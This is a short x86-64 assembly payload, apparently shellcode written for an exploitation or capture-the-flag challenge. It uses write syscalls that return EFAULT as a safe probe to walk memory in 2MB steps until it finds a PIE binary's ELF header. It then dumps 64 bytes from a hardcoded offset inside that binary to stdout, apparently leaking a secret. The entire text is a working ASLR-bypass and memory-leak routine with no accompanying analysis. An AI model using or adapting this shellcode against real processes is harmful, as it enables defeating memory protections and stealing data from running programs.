.intel_syntax noprefix
.section .text
.global _start
_start:
  lea rsp, [rip + 0x800]
  and rsp, -16

  # Scan the typical PIE/heap region for an ELF header at a 2MB boundary.
  # The binary is PIE and its PT_LOAD alignment is 0x200000.
  mov rbx, 0x0000540000000000
  mov ecx, 0x200000         # (0x58_0000_0000_00 - 0x54_0000_0000_00) / 0x200000

scan:
  mov eax, 1          # SYS_write
  mov edi, 1          # STDOUT
  mov rsi, rbx
  mov edx, 4
  syscall

  cmp rax, -14        # -EFAULT
  je next

  mov eax, dword ptr [rbx]
  cmp eax, 0x464c457f # 0x7f 'E' 'L' 'F'
  je found

next:
  add rbx, 0x200000
  loop scan

  mov eax, 60         # SYS_exit
  xor edi, edi
  syscall

found:
  lea rsi, [rbx + 0x202060]
  mov edx, 64
  mov eax, 1
  mov edi, 1
  syscall

  mov eax, 60
  xor edi, edi
  syscall
